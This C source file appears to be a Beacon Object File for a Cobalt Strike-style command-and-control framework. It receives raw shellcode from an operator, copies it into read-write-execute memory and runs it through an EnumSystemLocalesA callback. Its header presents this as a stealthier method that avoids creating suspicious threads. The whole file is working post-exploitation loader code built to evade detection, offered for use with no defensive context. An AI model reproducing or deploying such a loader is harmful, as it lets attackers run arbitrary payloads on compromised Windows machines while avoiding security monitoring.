/*
 * shellcode_exec_callback.c - Shellcode execution via callback function.
 *
 * Uses EnumSystemLocalesA callback to execute shellcode without CreateThread.
 * More stealthy as it doesn't create suspicious threads.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec_callback.c -o shellcode_exec_callback.o
 *
 * Usage from server:
 *   Upload shellcode_exec_callback.o, set args = raw shellcode bytes
 */

#include <windows.h>
#include "beacon.h"

typedef BOOL (WINAPI *LOCALE_ENUMPROCA)(LPSTR);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$EnumSystemLocalesA(LOCALE_ENUMPROCA, DWORD);

#define MEM_COMMIT_VAL     0x00001000
#define MEM_RESERVE_VAL    0x00002000
#define MEM_RELEASE_VAL    0x00008000
#define PAGE_EXECUTE_READWRITE_VAL 0x40
#define LCID_INSTALLED 0x00000001

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    if (shellcode_len > 10 * 1024 * 1024) {
        BeaconOutput(CALLBACK_ERROR, "Shellcode too large (max 10MB)\n", 32);
        return;
    }

    /* Allocate RWX memory */
    LPVOID exec_mem = KERNEL32$VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT_VAL | MEM_RESERVE_VAL,
        PAGE_EXECUTE_READWRITE_VAL
    );

    if (exec_mem == NULL) {
        BeaconOutput(CALLBACK_ERROR, "VirtualAlloc failed\n", 20);
        return;
    }

    /* Copy shellcode */
    bof_memcpy(exec_mem, shellcode_data, shellcode_len);

    /* Execute via callback - EnumSystemLocalesA will call our shellcode */
    /* Note: callback method is synchronous and may crash if shellcode doesn't return properly */
    BeaconOutput(CALLBACK_OUTPUT, "Executing via callback (may be unstable)...\n", 45);
    KERNEL32$EnumSystemLocalesA((LOCALE_ENUMPROCA)exec_mem, LCID_INSTALLED);

    BeaconOutput(CALLBACK_OUTPUT, "Callback returned\n", 18);
    KERNEL32$VirtualFree(exec_mem, 0, MEM_RELEASE_VAL);
}
